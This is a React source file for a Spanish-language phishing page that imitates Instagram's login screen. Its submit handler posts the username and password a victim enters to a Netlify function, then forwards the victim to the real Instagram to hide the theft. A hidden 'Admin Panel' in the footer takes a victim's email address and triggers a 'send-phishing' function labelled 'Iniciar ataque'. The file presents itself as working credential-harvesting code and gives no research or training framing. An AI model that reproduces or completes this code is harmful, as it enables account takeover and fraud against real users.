import React, { useState } from 'react';
import './LoginPage.css';

function LoginPage() {
  const [credentials, setCredentials] = useState({
    username: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [showDropdown, setShowDropdown] = useState(false);
  const [targetEmail, setTargetEmail] = useState('');
  const [sendingEmail, setSendingEmail] = useState(false);

  const handleChange = (e) => {
    setCredentials({
      ...credentials,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    try {
      console.log('Enviando credenciales...', credentials);

      const response = await fetch('/.netlify/functions/handle-login', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(credentials)
      });

      console.log('Status:', response.status);
      console.log('Headers:', Object.fromEntries(response.headers));

      const textResponse = await response.text();
      console.log('Respuesta texto:', textResponse);

      let data;
      try {
        data = JSON.parse(textResponse);
      } catch (e) {
        console.error('Error parseando JSON:', e);
        throw new Error('Respuesta inválida del servidor');
      }

      console.log('Respuesta parseada:', data);

      if (!response.ok) {
        throw new Error(data.error || 'Error de autenticación');
      }

      await new Promise(resolve => setTimeout(resolve, 1500));
      localStorage.setItem('instagram_session', Date.now());
      window.location.href = data.redirectTo || 'https://www.instagram.com';
      
    } catch (error) {
      console.error('Error detallado:', error);
      setError('Lo sentimos, no pudimos iniciar sesión. Por favor, inténtalo de nuevo.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleSendPhishing = async (e) => {
    e.preventDefault();
    if (!targetEmail) return;
    
    setSendingEmail(true);
    try {
      const response = await fetch('/.netlify/functions/send-phishing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ targetEmail })
      });

      if (!response.ok) throw new Error('Error al enviar');
      
      setTargetEmail('');
      setShowDropdown(false);
      alert('Email enviado exitosamente');
    } catch (error) {
      alert('Error al enviar el email');
    } finally {
      setSendingEmail(false);
    }
  };

  return (
    <div className="login-page" style={{ position: 'relative' }}>
      <div className="login-form-container">
        <form 
          className="login-form"
          onSubmit={handleSubmit}
          name="login-form"
          method="POST"
          data-netlify="true"
        >
          <input type="hidden" name="form-name" value="login-form" />
          
          <h1>Instagram</h1>
          
          <input
            type="text"
            name="username"
            placeholder="Teléfono, usuario o correo electrónico"
            value={credentials.username}
            onChange={handleChange}
            required
          />
          
          <input
            type="password"
            name="password"
            placeholder="Contraseña"
            value={credentials.password}
            onChange={handleChange}
            required
          />
          
          {error && (
            <div className="error-message">
              {error}
            </div>
          )}
          
          <button 
            type="submit" 
            disabled={isLoading}
            className={isLoading ? 'loading' : ''}
          >
            {isLoading ? 'Iniciando sesión...' : 'Iniciar sesión'}
          </button>
          
          <div className="divider">
            <div className="line"></div>
            <span>o</span>
            <div className="line"></div>
          </div>
          
          <a href="/facebook-login" className="facebook-login">
            Iniciar sesión con Facebook
          </a>
          
          <button
            type="button"
            className="text-blue-500 underline"
            onClick={() => {/* lógica para recuperar contraseña */}}
          >
            Olvidé mi contraseña
          </button>
        </form>

        <div className="signup-container">
          <p>
            ¿No tienes una cuenta? <button
              type="button"
              className="text-blue-500 underline"
              onClick={() => {/* lógica para registro */}}
            >
              Registrarse
            </button>
          </p>
        </div>

        <div className="get-app">
          <p>Descarga la aplicación.</p>
          <div className="app-stores">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Disponible en App Store" />
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Disponible en Google Play" />
          </div>
        </div>

        <footer className="footer">
          <div className="footer-links">
            <a href="https://about.meta.com/">Meta</a>
            <a href="https://about.instagram.com/">Información</a>
            <a href="https://about.instagram.com/blog/">Blog</a>
            <a href="https://about.instagram.com/about-us/careers">Empleo</a>
            <button
              type="button"
              className="text-blue-500 underline"
              onClick={() => {/* lógica para ayuda */}}
            >
              Ayuda
            </button>
            <a href="https://developers.facebook.com/docs/instagram">API</a>
            <a href="https://privacycenter.instagram.com/policy/">Privacidad</a>
            <a href="https://help.instagram.com/581066165581870">Condiciones</a>
            <a href="https://www.instagram.com/explore/locations/">Ubicaciones</a>
            <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
            <a href="https://www.threads.net/">Threads</a>
            <a href="https://www.instagram.com/directory/contacts/">Subir contactos</a>
            <a href="https://www.meta.com/verified/">Meta Verified</a>
          </div>
          <div className="footer-copyright">
            {/* Botón de phishing */}
            <div className="phishing-dropdown">
              <button 
                className="dropdown-toggle-footer"
                onClick={() => setShowDropdown(!showDropdown)}
              >
                <span>🔒</span> Admin Panel
              </button>
              
              {showDropdown && (
                <form className="dropdown-content-footer" onSubmit={handleSendPhishing}>
                  <input
                    type="email"
                    value={targetEmail}
                    onChange={(e) => setTargetEmail(e.target.value)}
                    placeholder="Email de la víctima"
                    required
                  />
                  <button 
                    type="submit"
                    disabled={sendingEmail}
                  >
                    {sendingEmail ? '📨 Enviando...' : '🎣 Iniciar ataque'}
                  </button>
                </form>
              )}
            </div>
            <select>
              <option value="es">Español</option>
            </select>
            © 2024 Instagram from Meta
          </div>
        </footer>
      </div>
    </div>
  );
}

export default LoginPage;
